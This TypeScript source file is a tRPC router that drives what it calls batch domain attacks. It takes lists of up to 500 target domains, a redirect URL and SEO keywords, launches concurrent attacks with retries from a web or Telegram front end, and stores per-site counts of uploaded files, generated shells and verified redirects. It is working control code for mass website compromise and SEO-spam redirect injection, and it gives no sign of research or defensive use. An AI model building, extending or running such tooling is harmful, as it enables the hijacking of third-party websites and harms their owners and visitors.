/**
 * Batch Attack tRPC Router — Web UI + API for batch domain attacks
 */
import { z } from "zod";
import { publicProcedure, router } from "../_core/trpc";
import {
  parseDomainList,
  runBatchAttack,
  getActiveBatch,
  getAllActiveBatches,
  cancelBatch,
  formatBatchSummary,
  type BatchConfig,
  type BatchStatus,
} from "../batch-attack-engine";
import { getDb } from "../db";
import { batchAttacks } from "../../drizzle/schema";
import { eq, desc, sql } from "drizzle-orm";

export const batchAttackRouter = router({
  /**
   * Parse domain list text and return validated domains
   */
  parseDomains: publicProcedure
    .input(z.object({ text: z.string() }))
    .mutation(({ input }) => {
      const domains = parseDomainList(input.text);
      return { domains, count: domains.length };
    }),

  /**
   * Start a batch attack from a list of domains
   */
  start: publicProcedure
    .input(z.object({
      domains: z.array(z.string()).min(1).max(500),
      redirectUrl: z.string().optional(),
      seoKeywords: z.array(z.string()).optional(),
      maxConcurrent: z.number().min(1).max(10).optional(),
      maxRetries: z.number().min(0).max(5).optional(),
      source: z.enum(["web", "telegram"]).optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();

      // Start batch attack (non-blocking — returns immediately with batchId)
      const config: BatchConfig = {
        maxConcurrent: input.maxConcurrent || 3,
        maxRetries: input.maxRetries || 2,
        redirectUrl: input.redirectUrl,
        seoKeywords: input.seoKeywords,
      };

      // We run the batch in background and save to DB
      const batchPromise = runBatchAttack(input.domains, config);

      // Get the batch status immediately (it starts right away)
      // We need to wait a tick for the batch to initialize
      await new Promise(r => setTimeout(r, 100));
      const batches = getAllActiveBatches();
      const latest = batches[batches.length - 1];

      if (!latest) {
        throw new Error("Failed to start batch attack");
      }

      // Save to DB
      if (db) {
        try {
          await db.insert(batchAttacks).values({
            batchId: latest.batchId,
            totalDomains: input.domains.length,
            redirectUrl: latest.redirectUrl,
            source: input.source || "web",
            status: "running",
            domainResults: JSON.stringify(input.domains.map(d => ({ domain: d, status: "pending" }))),
          });
        } catch (e: any) {
          console.error(`[BatchAttack] DB insert error: ${e.message}`);
        }
      }

      // Update DB when batch completes (background)
      batchPromise.then(async (finalStatus) => {
        if (db) {
          try {
            await db.update(batchAttacks)
              .set({
                successCount: finalStatus.success,
                failedCount: finalStatus.failed,
                skippedCount: finalStatus.skipped,
                cancelled: finalStatus.cancelled,
                status: finalStatus.cancelled ? "cancelled" : "completed",
                domainResults: JSON.stringify(finalStatus.domains.map(d => ({
                  domain: d.domain,
                  status: d.status,
                  durationMs: d.durationMs,
                  verifiedRedirects: d.verifiedRedirects,
                  uploadedFiles: d.uploadedFiles,
                  shellsGenerated: d.shellsGenerated,
                  retryCount: d.retryCount,
                  errors: d.errors.slice(0, 3),
                }))),
                completedAt: new Date(),
                totalDurationMs: finalStatus.completedAt
                  ? finalStatus.completedAt - finalStatus.startedAt
                  : Date.now() - finalStatus.startedAt,
              })
              .where(eq(batchAttacks.batchId, finalStatus.batchId));
          } catch (e: any) {
            console.error(`[BatchAttack] DB update error: ${e.message}`);
          }
        }
      }).catch(() => {});

      return {
        batchId: latest.batchId,
        totalDomains: input.domains.length,
        redirectUrl: latest.redirectUrl,
        status: "running" as const,
      };
    }),

  /**
   * Get status of a specific batch
   */
  status: publicProcedure
    .input(z.object({ batchId: z.string() }))
    .query(async ({ input }) => {
      // Check active batches first
      const active = getActiveBatch(input.batchId);
      if (active) return active;

      // Check DB for completed batches
      const db = await getDb();
      if (!db) return null;

      const [row] = await db.select()
        .from(batchAttacks)
        .where(eq(batchAttacks.batchId, input.batchId))
        .limit(1);

      if (!row) return null;

      return {
        batchId: row.batchId,
        startedAt: row.startedAt?.getTime() || 0,
        completedAt: row.completedAt?.getTime(),
        totalDomains: row.totalDomains,
        pending: 0,
        running: 0,
        success: row.successCount,
        failed: row.failedCount,
        skipped: row.skippedCount,
        cancelled: row.cancelled,
        redirectUrl: row.redirectUrl || "",
        domains: (row.domainResults as any[]) || [],
        progressPercent: 100,
        status: row.status,
      };
    }),

  /**
   * Get all active batches
   */
  active: publicProcedure.query(() => {
    return getAllActiveBatches();
  }),

  /**
   * Cancel a running batch
   */
  cancel: publicProcedure
    .input(z.object({ batchId: z.string() }))
    .mutation(async ({ input }) => {
      const cancelled = cancelBatch(input.batchId);

      // Also update DB
      const db = await getDb();
      if (db) {
        try {
          await db.update(batchAttacks)
            .set({ cancelled: true, status: "cancelled" })
            .where(eq(batchAttacks.batchId, input.batchId));
        } catch {}
      }

      return { success: cancelled };
    }),

  /**
   * Get batch history (completed batches from DB)
   */
  history: publicProcedure
    .input(z.object({
      limit: z.number().min(1).max(100).optional(),
      offset: z.number().min(0).optional(),
    }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) return { batches: [], total: 0 };

      const limit = input?.limit || 20;
      const offset = input?.offset || 0;

      const [countResult] = await db.select({ cnt: sql<number>`COUNT(*)` })
        .from(batchAttacks);

      const rows = await db.select()
        .from(batchAttacks)
        .orderBy(desc(batchAttacks.startedAt))
        .limit(limit)
        .offset(offset);

      return {
        batches: rows.map(r => ({
          batchId: r.batchId,
          totalDomains: r.totalDomains,
          success: r.successCount,
          failed: r.failedCount,
          skipped: r.skippedCount,
          cancelled: r.cancelled,
          redirectUrl: r.redirectUrl,
          source: r.source,
          status: r.status,
          startedAt: r.startedAt?.getTime(),
          completedAt: r.completedAt?.getTime(),
          totalDurationMs: r.totalDurationMs,
          domainResults: r.domainResults,
        })),
        total: countResult?.cnt || 0,
      };
    }),

  /**
   * Get summary text for a batch
   */
  summary: publicProcedure
    .input(z.object({ batchId: z.string() }))
    .query(({ input }) => {
      const active = getActiveBatch(input.batchId);
      if (!active) return null;
      return formatBatchSummary(active);
    }),
});
